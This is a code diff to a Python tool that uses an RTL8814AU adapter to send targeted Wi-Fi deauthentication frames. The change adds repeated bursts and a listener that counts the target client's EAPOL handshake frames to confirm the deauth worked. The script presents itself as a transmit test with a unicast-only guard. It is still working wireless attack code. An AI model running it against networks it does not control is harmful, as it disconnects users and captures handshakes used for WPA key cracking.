@@ -29,6 +29,7 @@ import asyncio
 import logging
 import struct
 import sys
+import time
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
@@ -61,6 +62,39 @@ def _build_deauth_frames(ap_mac: bytes, cl_mac: bytes) -> tuple[bytes, bytes]:
     return client_deauth, ap_deauth
 
 
+class _HandshakeTally:
+    """Driver rx callback: watches for the deauth's effect — the target AP's beacons
+    (confirms we're on-channel and hearing it), the target client's frames, and EAPOL
+    frames (the 4-way handshake a reconnecting client emits = the deauth worked)."""
+
+    def __init__(self, ap_bssid: str, client: str):
+        self.ap = ap_bssid.lower()
+        self.client = client.lower()
+        self.frames = 0
+        self.ap_beacons = 0
+        self.client_frames = 0
+        self.eapol = 0           # all EAPOL frames seen (any station)
+        self.client_eapol = 0    # EAPOL frames involving the target client — the signal
+
+    def __call__(self, parsed: dict) -> None:
+        self.frames += 1
+        ftype = parsed.get("type")
+        bssid = (parsed.get("bssid") or "").lower()
+        src = (parsed.get("source") or "").lower()
+        dst = (parsed.get("dest") or "").lower()
+        involves_client = self.client in (src, dst)
+        if ftype == "beacon" and bssid == self.ap:
+            self.ap_beacons += 1
+        if ftype == "eapol":
+            self.eapol += 1
+            # A 4-way handshake has the client as src (M2/M4) or dst (M1/M3); only those
+            # prove OUR deauthed client reconnected — another station's handshake doesn't.
+            if involves_client:
+                self.client_eapol += 1
+        if involves_client:
+            self.client_frames += 1
+
+
 async def run(args) -> int:
     client = args.client.lower()
     # Targeted-only guard: refuse broadcast / any group address (LSB of octet 0 set).
@@ -90,6 +124,8 @@ async def run(args) -> int:
         logging.debug("set_configuration: %s", e)
 
     driver = Rtl8814auDkmsDriver.from_usb_device(dev, entry)
+    tally = _HandshakeTally(args.bssid, client)
+    driver.register_rx_callback(tally)   # listen for the deauth's effect (handshake)
 
     def progress(pct, msg):
         print(f"  [{pct * 100:5.1f}%] {msg}")
@@ -107,23 +143,53 @@ async def run(args) -> int:
         await driver.close()
         return 0
 
-    print(f"[*] injecting {args.count}x bidirectional deauth ...")
+    print(f"[*] deauth-and-listen for {args.listen:g}s "
+          f"({args.count}x burst every {args.interval:g}s), watching for the reconnect "
+          f"handshake. Ctrl-C to stop.")
+    start = time.monotonic()
     sent = 0
     try:
-        for _ in range(args.count):
-            if await driver.inject_frame(client_deauth):
-                sent += 1
-            if await driver.inject_frame(ap_deauth):
-                sent += 1
-            await asyncio.sleep(0.01)
+        while time.monotonic() - start < args.listen:
+            for _ in range(args.count):                 # one deauth burst
+                if await driver.inject_frame(client_deauth):
+                    sent += 1
+                if await driver.inject_frame(ap_deauth):
+                    sent += 1
+                await asyncio.sleep(0.005)
+            # listen between bursts so the client can reconnect + we catch the handshake
+            await asyncio.sleep(args.interval)
+            print(f"\r  {time.monotonic() - start:4.0f}s  sent={sent}  "
+                  f"ap_beacons={tally.ap_beacons}  client_frames={tally.client_frames}  "
+                  f"eapol={tally.client_eapol}/{tally.eapol} (client/total)", end="")
+    except KeyboardInterrupt:
+        pass
     except usb.core.USBError as e:
-        print(f"[FAIL] bulk-OUT error after {sent} frames: {e} "
+        print(f"\n[FAIL] bulk-OUT error after {sent} frames: {e} "
               f"(if the pipe wedged, unplug/replug and rerun)")
         await driver.close()
         return 1
+    print()
     await driver.close()
-    print(f"[RESULT] injected {sent} deauth frames with no pipe fault. "
-          f"Confirm the client dropped/reconnected to verify TX actually went out.")
+
+    print(f"[RESULT] injected {sent} deauth frames, no pipe fault. "
+          f"Heard {tally.ap_beacons} target-AP beacons, {tally.frames} frames total, "
+          f"{tally.client_frames} involving the client; EAPOL "
+          f"{tally.client_eapol} from the client / {tally.eapol} total.")
+    if tally.ap_beacons == 0:
+        print("  [?] Did NOT hear the target AP on this channel — wrong channel / out of "
+              "range / RX not working. The deauth test is inconclusive until we hear the AP.")
+    elif tally.client_eapol > 0:
+        print(f"  [PASS] Captured {tally.client_eapol} EAPOL handshake frame(s) FROM/TO the "
+              "target client — it reconnected, so the deauth landed and TX is confirmed.")
+    elif tally.eapol > 0:
+        print(f"  [?] Saw {tally.eapol} EAPOL frame(s) but NONE involving the target client "
+              "— that's another station's handshake, not proof our deauth worked.")
+    elif tally.client_frames > 0:
+        print("  [~] Heard the AP and the client, but no reconnect handshake — the client "
+              "stayed associated, so the deauth likely isn't reaching it (TX suspect).")
+    else:
+        print("  [~] Heard the AP but no client traffic/handshake — client idle/absent, or "
+              "the deauth isn't being transmitted. Inconclusive.")
     return 0
 
 
@@ -133,7 +199,11 @@ def main() -> int:
     ap.add_argument("--client", required=True,
                     help="target client STA (unicast only — broadcast is refused)")
     ap.add_argument("--channel", type=int, required=True, help="the AP's 2.4G channel")
-    ap.add_argument("--count", type=int, default=10, help="deauth bursts (default 10)")
+    ap.add_argument("--count", type=int, default=10, help="frames per deauth burst (default 10)")
+    ap.add_argument("--listen", type=float, default=30.0,
+                    help="deauth-and-listen window in seconds (default 30)")
+    ap.add_argument("--interval", type=float, default=2.0,
+                    help="seconds between deauth bursts while listening (default 2)")
     ap.add_argument("--dry-run", action="store_true",
                     help="bring up + tune + build frames, but transmit NOTHING")
     ap.add_argument("--debug", action="store_true")
